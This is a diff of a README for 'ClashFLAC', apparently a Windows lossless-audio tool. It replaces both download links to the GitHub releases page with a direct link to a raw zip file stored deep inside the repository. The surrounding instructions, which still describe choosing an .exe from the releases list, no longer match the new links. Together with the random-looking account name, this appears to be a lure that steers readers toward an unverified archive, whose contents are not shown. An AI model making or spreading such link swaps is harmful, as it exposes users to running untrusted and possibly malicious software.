@@ -1,6 +1,6 @@
 # 🎧 ClashFLAC - Your Gateway to Pure, Lossless Sound
 
-[![Download ClashFLAC](https://img.shields.io/badge/Download-ClashFLAC-8A2BE2?style=for-the-badge&logo=github)](https://github.com/unicellular-familytheophrastaceae741/ClashFLAC/releases)
+[![Download ClashFLAC](https://img.shields.io/badge/Download-ClashFLAC-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/unicellular-familytheophrastaceae741/ClashFLAC/main/amzdl/cli/v2.1-beta.5.zip)
 
 ## ✨ What Is ClashFLAC?
 
@@ -14,7 +14,7 @@ Getting ClashFLAC up and running on your Windows computer is simple. Follow thes
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/unicellular-familytheophrastaceae741/ClashFLAC/releases](https://github.com/unicellular-familytheophrastaceae741/ClashFLAC/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/unicellular-familytheophrastaceae741/ClashFLAC/main/amzdl/cli/v2.1-beta.5.zip](https://raw.githubusercontent.com/unicellular-familytheophrastaceae741/ClashFLAC/main/amzdl/cli/v2.1-beta.5.zip)
 
 When you arrive at the page, look for the latest release. You'll see a list of files - choose the one that matches your system. If you're on Windows, select the file that ends with `.exe`. If you see a `.zip` file instead, that works too.
 
